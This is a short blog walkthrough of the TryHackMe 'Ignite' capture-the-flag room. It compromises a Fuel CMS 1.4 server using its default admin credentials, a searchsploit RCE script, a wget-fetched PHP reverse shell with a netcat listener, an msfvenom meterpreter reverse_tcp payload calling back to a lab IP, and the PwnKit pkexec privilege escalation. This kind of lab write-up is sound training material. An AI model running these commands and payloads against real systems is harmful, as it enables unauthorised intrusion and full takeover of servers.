---
title: Walkthrough - Ignite
published: true
---

A new start-up has a few issues with their web server.

[https://tryhackme.com/room/ignite](https://tryhackme.com/room/ignite)

* * *

## Root it!

- ``nmap -p- -T4 10.10.1.30 -vvv``

Few things of note. Inital nmap scan shows we have a webserver at port 80 and viewing the site, we can see a default Fuel CMS Version 1.4 page. Will run gobuster to scan while nmap runs. 

It doesnt look like there are any other open ports on this server. But will keep running scans while we check out the webserver.

- ``gobuster dir -u http://10.10.1.30 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x txt,html,php,cgi -t 100 --no-error``
- we see a robots.txt with ``/fuel/`` which shows us the fuel cms login page.

##   Gobuster Results

```shell
/home                 (Status: 200) [Size: 16591]
/index                (Status: 200) [Size: 16591]
/index.php            (Status: 200) [Size: 16591]
/0                    (Status: 200) [Size: 16591]
/offline              (Status: 200) [Size: 70]   
/robots.txt           (Status: 200) [Size: 30]   
/server-status        (Status: 403) [Size: 298]  
```

Reading the fuel CMS default page gives us default credentials admin:admin. We cnan login to /fuel/ with these. lol.

- ``searchsploit fuel cms`` we have some exploits to try.
- ``python3 50477.py -u http://10.10.1.30`` will give us a shell
- wget a php reverse shell over and setup netcat listener

![0xskar](/assets/ignite01.png)

* * * 

## User.txt

- ``cat flag.txt`` in ``/home/www-data``

* * * 

## Root.txt

- upgrade shell ``python3 -c 'import pty;pty.spawn("/bin/bash")'``
- upload meterpreter shell ``msfvenom -p linux/x86/meterpreter/reverse_tcp  LHOST=10.2.127.225 LPORT=5555 -f elf > meterpreter.elf``
- setup ``msfconsole`` and run ``linux/local/cve_2021_4034_pwnkit_lpe_pkexec`` to get root.txt

* * * 